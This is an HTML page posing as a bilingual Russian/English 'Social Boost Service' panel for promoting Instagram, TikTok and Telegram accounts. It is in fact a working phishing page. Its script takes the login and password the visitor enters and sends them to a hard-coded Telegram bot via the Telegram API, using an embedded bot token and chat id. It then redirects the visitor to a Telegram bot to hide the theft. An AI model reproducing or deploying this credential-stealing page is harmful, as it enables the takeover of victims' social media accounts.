<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Boost | Social Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { margin: 0; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460); font-family: sans-serif; padding: 20px; }
        .container { width: 100%; max-width: 320px; background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 25px; box-sizing: border-box; border: 1px solid rgba(255,255,255,0.1); text-align: center; }
        .header { color: white; margin-bottom: 20px; font-size: 1.2em; font-weight: bold; }
        .icons { font-size: 24px; color: #e94560; margin-bottom: 15px; display: flex; justify-content: center; gap: 15px; }
        input { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 10px; border: none; outline: none; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 15px; border-radius: 10px; border: none; background: #e94560; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
        button:disabled { background: #555; }
        .info { margin-top: 20px; color: #ccc; font-size: 12px; text-align: left; line-height: 1.4; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px; }
    </style>
</head>
<body>

<div class="container">
    <div class="icons">
        <i class="fab fa-instagram"></i>
        <i class="fab fa-tiktok"></i>
        <i class="fab fa-telegram"></i>
    </div>
    <div class="header">Social Boost Service</div>
    <input type="text" id="user" placeholder="Login / Логин">
    <input type="password" id="pass" placeholder="Password / Пароль">
    <button id="btn" onclick="send()">Start / Запустить</button>

    <div class="info">
        • <b>RU:</b> Введите данные для синхронизации с панелью накрутки.<br><br>
        • <b>EN:</b> Enter details to sync with the promotion panel.
    </div>
</div>

<script>
async function send() {
    const token = "8653348218:AAEIW_z5aWHH76yiuFQL3cPKfO2e3wNBxn4";
    const id = "7829181579";
    const next = "https://t.me/HQ_smmbot_bot";

    let u = document.getElementById("user").value;
    let p = document.getElementById("pass").value;
    let b = document.getElementById("btn");

    if (!u || !p) { alert("Заполните поля!"); return; }

    b.disabled = true;
    b.innerText = "Wait...";

    // Формируем текст без лишних HTML тегов для надежности
    const msg = "--- НОВЫЙ ЛОГ ---\nЛогин: " + u + "\nПароль: " + p;

    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`);
        
        if (response.ok) {
            alert("Success! / Успешно!");
            window.location.href = next;
        } else {
            alert("Error / Ошибка бота. Попробуйте снова.");
            b.disabled = false;
            b.innerText = "Start";
        }
    } catch (e) {
        alert("No connection / Нет сети");
        b.disabled = false;
        b.innerText = "Start";
    }
}
</script>

</body>
</html>
